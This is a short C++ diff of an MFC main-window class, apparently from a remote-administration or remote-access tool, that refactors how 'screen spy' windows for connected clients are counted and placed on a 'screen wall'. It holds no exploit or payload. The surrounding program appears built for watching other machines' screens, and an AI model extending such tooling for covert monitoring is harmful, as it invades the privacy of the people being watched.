@@ -216,7 +216,7 @@ CMainFrame::CMainFrame()
 	m_strIniFileName = szStylesPath;
 	
 	m_nColumns = 0;
-	m_nWallCount = 0;
+
 	
 	m_pItemsShapes = 0;
 	m_pItemsStyles = 0;
@@ -1535,7 +1535,6 @@ LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
 	return 0;
 }
 
-
 LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
 	//检查是否已经启动过了，同时只能存在一个屏幕墙
@@ -1546,14 +1545,14 @@ LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 	//AfxMessageBox("Start sCreen Share");
 	ClientContext *pContext = (ClientContext *)lParam;
 	
-	CScreenSpyDlgSmall	*dlg = new CScreenSpyDlgSmall(this, m_iocpServer, pContext);
+	CScreenSpyDlgSmall	*dlg = new CScreenSpyDlgSmall(&m_dlgVideo, m_iocpServer, pContext);
 
 
 
 
 	CRect IFramerect;
     CStatic* pStatic;
-	pStatic = (CStatic*)m_dlgVideo.GetDlgItem(staticList[m_nWallCount]);
+	pStatic = (CStatic*)m_dlgVideo.GetDlgItem(staticList[m_dlgVideo.m_nWallCount]);
     //pStatic = (CStatic*)GetDlgItem(IDC_STATIC);
 
 
@@ -1565,7 +1564,7 @@ LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 	dlg->GetWindowRect(IFramerect);
 	dlg->SetWindowPos(&wndTop, 0, 0, IFramerect.Width(), IFramerect.Height(), SWP_SHOWWINDOW);
     dlg->ShowWindow(SW_SHOW);
-	m_nWallCount++;
+	m_dlgVideo.m_nWallCount++;
 	
 	
 	pContext->m_Dialog[0] = SCREENSPY_DLG;
